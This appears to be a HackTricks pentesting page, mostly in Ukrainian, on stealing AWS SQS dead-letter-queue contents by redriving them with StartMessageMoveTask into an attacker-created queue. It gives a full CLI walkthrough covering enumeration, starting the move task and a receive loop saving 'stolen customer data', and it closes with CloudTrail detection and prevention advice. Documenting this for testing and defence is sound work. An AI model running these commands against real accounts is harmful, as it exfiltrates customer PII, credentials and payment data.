# AWS – SQS DLQ Redrive Exfiltration via StartMessageMoveTask

{{#include ../../../banners/hacktricks-training.md}}

## Description

Зловживання задачами переміщення повідомлень SQS для викрадення всіх накопичених повідомлень з Dead-Letter Queue (DLQ) жертви шляхом перенаправлення їх до черги, якою керує атакуючий, використовуючи `sqs:StartMessageMoveTask`. Ця техніка експлуатує легітимну функцію відновлення повідомлень AWS для ексфільтрації чутливих даних, які накопичувалися в DLQ з часом.

## What is a Dead-Letter Queue (DLQ)?

Dead-Letter Queue — це спеціальна черга SQS, куди повідомлення автоматично відправляються, коли основний додаток не зміг їх успішно обробити. Ці невдалі повідомлення часто містять:
- Чутливі дані додатку, які не вдалося обробити
- Деталі помилок та інформацію для налагодження
- Персональні ідентифікатори (PII)
- API токени, облікові дані або інші секрети
- Критично важливі для бізнесу транзакційні дані

DLQ виступають як «кладовище» для невдалих повідомлень, що робить їх цінними цілями, оскільки вони накопичують чутливі дані з часом, які додатки не змогли обробити правильно.

## Attack Scenario

**Real-world example:**
1. **E-commerce application** обробляє замовлення клієнтів через SQS
2. **Деякі замовлення не вдаються** (проблеми з оплатою, з інвентарем тощо) і потрапляють до DLQ
3. **DLQ накопичує** тижні/місяці невдалих замовлень, які містять дані клієнтів: `{"customerId": "12345", "creditCard": "4111-1111-1111-1111", "orderTotal": "$500"}`
4. **Атакуючий отримує доступ** до AWS облікових даних з дозволами на SQS
5. **Атакуючий виявляє**, що DLQ містить тисячі невдалих замовлень з чутливими даними
6. **Замість спроби доступитися до окремих повідомлень** (повільно і помітно), атакуючий використовує `StartMessageMoveTask` щоб масово перемістити ВСІ повідомлення до своєї черги
7. **Атакуючий витягує** всі історичні чутливі дані за одну операцію

## Requirements
- Джерельна черга повинна бути налаштована як DLQ (посилана принаймні однією політикою RedrivePolicy іншої черги).
- IAM дозволи (виконуються під скомпрометованим принципалом жертви):
- На DLQ (джерелі): `sqs:StartMessageMoveTask`, `sqs:GetQueueAttributes`.
- На черзі-призначенні: дозвіл доставляти повідомлення (наприклад, політика черги, що дозволяє `sqs:SendMessage` від принципала жертви). Для призначень в тій же акаунті це зазвичай дозволено за замовчуванням.
- Якщо увімкнено SSE-KMS: на джерельному CMK `kms:Decrypt`, а на CMK призначення — `kms:GenerateDataKey`, `kms:Encrypt`.

## Impact
Ексфільтрація чутливих корисних навантажень, накопичених у DLQ (невдалі події, PII, токени, корисні навантаження додатків) на великій швидкості за допомогою рідних SQS API. Працює між акаунтами, якщо політика черги призначення дозволяє `SendMessage` від принципала жертви.

## How to Abuse

- Визначте ARN жертви DLQ і переконайтесь, що вона дійсно використовується як DLQ якоюсь чергою (будь-яка черга підійде).
- Створіть або виберіть чергу, якою керує атакуючий, і отримайте її ARN.
- Запустіть задачу переміщення повідомлень з DLQ жертви до вашої черги-призначення.
- Моніторте прогрес або скасуйте за потреби.

### CLI Example: Exfiltrating Customer Data from E-commerce DLQ

**Scenario**: Атакуючий скомпрометував AWS облікові дані і виявив, що e-commerce додаток використовує SQS з DLQ, яка містить невдалі спроби обробки замовлень клієнтів.

1) **Discover and examine the victim DLQ**
```bash
# List queues to find DLQs (look for names containing 'dlq', 'dead', 'failed', etc.)
aws sqs list-queues --queue-name-prefix dlq

# Let's say we found: https://sqs.us-east-1.amazonaws.com/123456789012/ecommerce-orders-dlq
VICTIM_DLQ_URL="https://sqs.us-east-1.amazonaws.com/123456789012/ecommerce-orders-dlq"
SRC_ARN=$(aws sqs get-queue-attributes --queue-url "$VICTIM_DLQ_URL" --attribute-names QueueArn --query Attributes.QueueArn --output text)

# Check how many messages are in the DLQ (potential treasure trove!)
aws sqs get-queue-attributes --queue-url "$VICTIM_DLQ_URL" \
--attribute-names ApproximateNumberOfMessages
# Output might show: "ApproximateNumberOfMessages": "1847"
```
2) **Створіть attacker-controlled destination queue**
```bash
# Create our exfiltration queue
ATTACKER_Q_URL=$(aws sqs create-queue --queue-name hacker-exfil-$(date +%s) --query QueueUrl --output text)
ATTACKER_Q_ARN=$(aws sqs get-queue-attributes --queue-url "$ATTACKER_Q_URL" --attribute-names QueueArn --query Attributes.QueueArn --output text)

echo "Created exfiltration queue: $ATTACKER_Q_ARN"
```
3) **Виконайте bulk message theft**
```bash
# Start moving ALL messages from victim DLQ to our queue
# This operation will transfer thousands of failed orders containing customer data
echo "Starting bulk exfiltration of $SRC_ARN to $ATTACKER_Q_ARN"
TASK_RESPONSE=$(aws sqs start-message-move-task \
--source-arn "$SRC_ARN" \
--destination-arn "$ATTACKER_Q_ARN" \
--max-number-of-messages-per-second 100)

echo "Move task started: $TASK_RESPONSE"

# Monitor the theft progress
aws sqs list-message-move-tasks --source-arn "$SRC_ARN" --max-results 10
```
4) **Збирати вкрадені конфіденційні дані**
```bash
# Receive the exfiltrated customer data
echo "Receiving stolen customer data..."
aws sqs receive-message --queue-url "$ATTACKER_Q_URL" \
--attribute-names All --message-attribute-names All \
--max-number-of-messages 10 --wait-time-seconds 5

# Example of what an attacker might see:
# {
#   "Body": "{\"customerId\":\"cust_12345\",\"email\":\"john@example.com\",\"creditCard\":\"4111-1111-1111-1111\",\"orderTotal\":\"$299.99\",\"failureReason\":\"Payment declined\"}",
#   "MessageId": "12345-abcd-6789-efgh"
# }

# Continue receiving all messages in batches
while true; do
MESSAGES=$(aws sqs receive-message --queue-url "$ATTACKER_Q_URL" \
--max-number-of-messages 10 --wait-time-seconds 2 --output json)

if [ "$(echo "$MESSAGES" | jq '.Messages | length')" -eq 0 ]; then
echo "No more messages - exfiltration complete!"
break
fi

echo "Received batch of stolen data..."
# Process/save the stolen customer data
echo "$MESSAGES" >> stolen_customer_data.json
done
```
### Примітки щодо міжакаунтного доступу
- Черга призначення повинна мати політику ресурсів, яка дозволяє принципалу жертви виконувати `sqs:SendMessage` (і, якщо використовується, KMS grants/permissions).

## Чому ця атака ефективна

1. **Legitimate AWS Feature**: Використовує вбудовану функціональність AWS, що ускладнює виявлення як зловмисну  
2. **Bulk Operation**: Швидко переносить тисячі повідомлень замість повільного доступу до кожного окремо  
3. **Historical Data**: DLQs накопичують конфіденційні дані протягом тижнів/місяців  
4. **Under the Radar**: Багато організацій не моніторять доступ до DLQ уважно  
5. **Cross-Account Capable**: Може ексфільтрувати в акаунт AWS атакуючого, якщо дозволи це дозволяють

## Виявлення та запобігання

### Виявлення
Моніторити CloudTrail на предмет підозрілих викликів API `StartMessageMoveTask`:
```json
{
"eventName": "StartMessageMoveTask",
"sourceIPAddress": "suspicious-ip",
"userIdentity": {
"type": "IAMUser",
"userName": "compromised-user"
},
"requestParameters": {
"sourceArn": "arn:aws:sqs:us-east-1:123456789012:sensitive-dlq",
"destinationArn": "arn:aws:sqs:us-east-1:attacker-account:exfil-queue"
}
}
```
### Запобігання
1. **Least Privilege**: Обмежуйте дозволи `sqs:StartMessageMoveTask` лише для необхідних ролей
2. **Monitor DLQs**: Налаштуйте CloudWatch alarms для сповіщення про аномальну активність у DLQs
3. **Cross-Account Policies**: Ретельно перевіряйте політики черг SQS, які дозволяють доступ між акаунтами
4. **Encrypt DLQs**: Використовуйте SSE-KMS з обмеженими політиками ключів
5. **Regular Cleanup**: Не дозволяйте чутливим даним накопичуватися в DLQs невизначено довго

{{#include ../../../banners/hacktricks-training.md}}
